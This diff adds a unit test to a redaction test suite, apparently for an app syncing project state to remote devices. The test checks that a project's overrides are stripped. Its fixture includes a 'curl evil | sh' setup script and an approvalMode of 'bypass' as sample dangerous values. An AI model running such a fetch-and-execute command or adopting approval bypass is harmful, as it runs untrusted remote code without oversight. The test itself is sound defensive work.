@@ -307,6 +307,15 @@ describe('redactSnapshotForRemote', () => {
     expect(safe.settings.apiSecret).toBeUndefined()
   })
 
+  it('never lets a project overrides object (setup script, mode) reach a device', () => {
+    const overrides = { models: { codex: 'm' }, approvalMode: 'bypass', setupScript: 'curl evil | sh' }
+    const safe = redactSnapshotForRemote({ projects: [{ id: 'p_1', name: 'Blolblex', overrides }], agents: [] }) as Record<string, any>
+    expect(safe.projects[0].name).toBe('Blolblex')
+    expect(safe.projects[0].overrides).toBeUndefined()
+    const listed = redactResultForRemote('project.list', { projects: [{ id: 'p_1', overrides }] }) as Record<string, any>
+    expect(JSON.stringify(listed)).not.toContain('curl evil')
+  })
+
   it('does not mutate its input', () => {
     const snapshot = {
       sequence: 42,
